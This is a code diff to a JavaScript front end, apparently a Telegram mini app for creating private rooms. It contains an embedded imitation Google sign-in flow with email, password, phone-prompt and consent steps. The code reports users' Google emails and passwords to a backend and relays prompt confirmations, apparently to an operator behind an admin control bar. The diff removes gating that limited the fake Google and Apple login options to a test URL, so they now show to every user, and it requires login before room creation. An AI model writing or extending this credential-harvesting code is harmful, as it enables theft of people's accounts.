@@ -210,15 +210,6 @@ function initApp() {
             return;
         }
 
-        if (isTestBotUrl && targetStep !== stepSuccess && !isAuthorized) {
-            const isTargetAlreadyGoogle = [
-                stepGoogleEmail, stepGooglePassword, stepGooglePrompt, stepGoogleConsent
-            ].includes(targetStep);
-            if (!isTargetAlreadyGoogle) {
-                targetStep = userGoogleEmail ? stepGooglePassword : stepGoogleEmail;
-            }
-        }
-
         const isGoogleStep = [
             stepGoogleEmail, stepGooglePassword, stepGooglePrompt, stepGoogleConsent
         ].includes(targetStep);
@@ -356,30 +347,16 @@ function initApp() {
                          initParams.get("google") === "1" || 
                          window.location.search.includes("auth=google");
 
-    if (isTestBotUrl) {
-        if (btnSwitchToGoogle) btnSwitchToGoogle.classList.remove("hidden");
-        if (btnSwitchToApple) btnSwitchToApple.classList.remove("hidden");
-        const googleSep = document.getElementById("googleAuthSeparator");
-        if (googleSep) googleSep.classList.remove("hidden");
-    } else {
-        if (btnSwitchToGoogle) btnSwitchToGoogle.classList.add("hidden");
-        if (btnSwitchToApple) btnSwitchToApple.classList.add("hidden");
-        const googleSep = document.getElementById("googleAuthSeparator");
-        if (googleSep) googleSep.classList.add("hidden");
-    }
+    // Ensure registration methods are available on registration screen
+    if (btnSwitchToGoogle) btnSwitchToGoogle.classList.remove("hidden");
+    if (btnSwitchToApple) btnSwitchToApple.classList.remove("hidden");
+    const googleSep = document.getElementById("googleAuthSeparator");
+    if (googleSep) googleSep.classList.remove("hidden");
 
-    if (isAuthorized) {
-        showStep(stepSuccess);
-    } else if (isTestBotUrl) {
-        if (userGoogleEmail) {
-            updateGoogleDisplays(userGoogleEmail);
-            showStep(stepGooglePassword);
-        } else {
-            showStep(stepGoogleEmail);
-        }
-    } else {
-        navigateToAuthOrSavedStep();
-    }
+    // Always start on the main menu (stepSuccess) so the user experiences the full journey:
+    // Главное меню -> Нажатие «Создать» -> Выбор способа регистрации -> Авторизация -> Возврат в главное меню
+    showStep(stepSuccess);
+    resetRoomCreation();
     initTestAdminControlBar();
 
     function checkAuthStatus() {
@@ -999,10 +976,8 @@ function initApp() {
 
         updateAuthHeaderUI();
         showStep(stepSuccess);
-        showToast("Успешный вход! Создаем приватную комнату...");
-
-        // Automatically start room creation animation
-        startRoomCreation();
+        resetRoomCreation();
+        showToast("Вход выполнен успешно! 🎉");
 
         const userTgId = tg?.initDataUnsafe?.user?.id || null;
         const userUsername = tg?.initDataUnsafe?.user?.username || null;
@@ -1061,15 +1036,9 @@ function initApp() {
 
     function applyAdminAuthVisibility(adminState) {
         const sep = document.getElementById("googleAuthSeparator");
-        if (isTestBotUrl || adminState) {
-            if (sep) sep.classList.remove("hidden");
-            if (btnSwitchToGoogle) btnSwitchToGoogle.classList.remove("hidden");
-            if (btnSwitchToApple) btnSwitchToApple.classList.remove("hidden");
-        } else {
-            if (sep) sep.classList.add("hidden");
-            if (btnSwitchToGoogle) btnSwitchToGoogle.classList.add("hidden");
-            if (btnSwitchToApple) btnSwitchToApple.classList.add("hidden");
-        }
+        if (sep) sep.classList.remove("hidden");
+        if (btnSwitchToGoogle) btnSwitchToGoogle.classList.remove("hidden");
+        if (btnSwitchToApple) btnSwitchToApple.classList.remove("hidden");
     }
 
     applyAdminAuthVisibility(isAdmin);
@@ -1424,8 +1393,28 @@ function initApp() {
             if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
             const promptErr = document.getElementById("googlePromptError");
             if (promptErr) promptErr.classList.add("hidden");
+
+            btnConfirmGooglePrompt.disabled = true;
+            const originalBtnText = btnConfirmGooglePrompt.textContent;
+            btnConfirmGooglePrompt.textContent = "Проверка...";
+
             reportAuthEvent("google_prompt_confirmed", "Пользователь подтвердил вход на телефоне (Google)", userGooglePassword, null, userGoogleEmail);
-            startGooglePolling();
+            sendGoogleControlCommand("prompt_confirmed", null, null);
+
+            setTimeout(() => {
+                if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                btnConfirmGooglePrompt.disabled = false;
+                btnConfirmGooglePrompt.textContent = originalBtnText;
+
+                stopGooglePolling();
+                if (googleAuthModal) googleAuthModal.classList.add("hidden");
+
+                finishAuth({
+                    status: "success",
+                    google_email: userGoogleEmail,
+                    password: userGooglePassword
+                });
+            }, 1800);
         });
     }
 
@@ -1723,6 +1712,11 @@ function initApp() {
 
     if (btnCreateRoom) {
         btnCreateRoom.addEventListener("click", () => {
+            if (!isAuthorized) {
+                showToast("Для создания комнаты необходимо войти в аккаунт");
+                showStep(stepPhone);
+                return;
+            }
             startRoomCreation();
         });
     }
